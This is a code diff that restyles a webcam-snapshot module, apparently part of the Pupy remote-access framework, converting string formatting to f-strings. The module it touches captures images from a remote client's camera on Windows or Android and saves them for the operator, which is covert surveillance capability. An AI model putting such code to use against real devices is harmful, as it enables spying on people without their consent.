@@ -32,7 +32,7 @@ def pil_save(filename, pixels, width, height):
     ImageFile.MAXBLOCK = width * height
     img=img.transpose(Image.FLIP_TOP_BOTTOM)
     img.save(filename, quality=95, optimize=True, progressive=True)
-    logging.info('webcam snap saved to %s'%filename)
+    logging.info(f'webcam snap saved to {filename}')
 
 @config(cat="gather", compat=["windows", "android"])
 class WebcamSnapModule(PupyModule):
@@ -56,10 +56,16 @@ class WebcamSnapModule(PupyModule):
             os.makedirs(os.path.join("data","webcam_snaps"))
         except Exception:
             pass
-        filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
+        filepath = os.path.join(
+            "data",
+            "webcam_snaps",
+            f"snap_{self.client.short_name()}_"
+            + str(datetime.datetime.now()).replace(" ", "_").replace(":", "-")
+            + ".jpg",
+        )
         if self.client.is_windows():
             dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
-            self.info("device %s exists, taking a snap ..."%args.device)
+            self.info(f"device {args.device} exists, taking a snap ...")
             buff, width, height = dev.getbuffer()
             pil_save(filepath, buff, width, height)
         elif self.client.is_android():
@@ -72,4 +78,4 @@ class WebcamSnapModule(PupyModule):
                     f.write(data)
         if args.view:
             subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
-        self.success("webcam picture saved to %s"%filepath)
+        self.success(f"webcam picture saved to {filepath}")
